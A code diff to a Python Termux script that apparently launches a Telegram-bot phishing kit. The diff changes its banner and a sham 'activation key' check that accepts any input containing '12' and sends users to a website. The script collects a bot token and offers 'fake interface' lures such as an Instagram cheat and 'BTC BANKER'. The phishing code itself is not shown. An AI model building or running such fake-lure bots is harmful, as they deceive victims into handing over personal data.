@@ -27,23 +27,40 @@ input(Fore.GREEN + '\033[1;40m\033[31m[\033[32m*\033[31m]\033[96m Press Enter to
 print("\n")
 print("\n")
 os.system('clear')
-print(Fore.RED + '''
-         _,.-------.,_
-    ''')
-user_input = input(Fore.GREEN + "\033[1;40m\033[31m[\033[32m*\033[31m]\033[96m Enter Activation Key: \033[0m")
+print("\n")
+print("\n")
+print("\033[33m"
+      "      ██╗  ██╗███████╗██╗   ██╗\n"
+      "      ██║ ██╔╝██╔════╝╚██╗ ██╔╝\n"
+      "      █████╔╝ █████╗   ╚████╔╝\n"
+      "      ██╔═██╗ ██╔══╝    ╚██╔╝\n"
+      "      ██║  ██╗███████╗   ██║\n"
+      "      ╚═╝  ╚═╝╚══════╝   ╚═╝    \033[0m\n")
+print("\n")
+print("\n")
+print("\033[1;33m[\033[0m\033[1;77m~\033[0m\033[1;33m]\033[0m\033[1;32m \033[92m Activation Key 100% Free. Dont Buy  \033[34m( \033[1;36mOnline Hacking \033[34m) \033[0m")
+print("\n")
+print("\033[1;33m[\033[0m\033[1;77m~\033[0m\033[1;33m]\033[0m\033[1;32m \033[95m Visit This Website Article and Scroll down and click Generate Key button \033[0m")
+print("\n")
+print("\033[91m[\033[92m*\033[91m]\033[1;93m Link :\033[0m\033[1;36m https://termux.xyz/  ")
+print("\n")
+print("\n")
+
+user_input = input(Fore.GREEN + "\033[1;40m\033[31m[\033[32m*\033[31m]\033[92m Enter Activation Key: \033[0m")
+
 if "12" in user_input:
-    print('Correct! You entered a number containing 12')
+    print(Fore.GREEN +'\033[1;32m\n\nCorrect! You Enter a Correct Activation Key\n\n')
+    time.sleep(3)
     os.system('clear')
     print(Fore.YELLOW + '-----------------------------------------')
     userid = input(Fore.RED +  "Enter your Telegram ID > ")
     token = input(Fore.BLUE +  "Enter your bot token > ")
-    print(Fore.CYAN + '''
-    [1] Punched the number
-    [2] Instagram cheat
-    [3] Brawl stars
-    [4] Acquaintance
-    [5] BTC BANKER
-    ''')
+    print("\n\n\033[1;31m[\033[0m\033[1;92m1\033[0m\033[1;31m] \033[0m\033[1;37;44m Punched the number \033[0m  ")
+    print("\n\033[1;31m[\033[0m\033[1;92m2\033[0m\033[1;31m] \033[0m\033[1;37;41m Instagram cheat \033[0m  ")
+    print("\n\033[1;31m[\033[0m\033[1;92m3\033[0m\033[1;31m] \033[0m\033[1;91;107m Brawl stars \033[0m  ")
+    print("\n\033[1;31m[\033[0m\033[1;92m4\033[0m\033[1;31m] \033[0m\033[1;48;5;21m Acquaintance \033[0m ")
+    print("\n\033[1;31m[\033[0m\033[1;92m5\033[0m\033[1;31m] \033[0m\033[1;48;5;200m BTC BANKER \033[0m  ")
+    print(" ")
     choice = input(Fore.MAGENTA +  "Select the fake interface option:>>> ")
 
     if not choice.isdigit():
@@ -704,4 +721,5 @@ bot.polling()
     else:
         print('Invalid choice')
 else:
-    print('Sorry, the entered number does not contain 12')
+    print(Fore.RED +'\033[1;91m\n\nSorry, You Enter Incorrect Activation Key\n\n')
+    
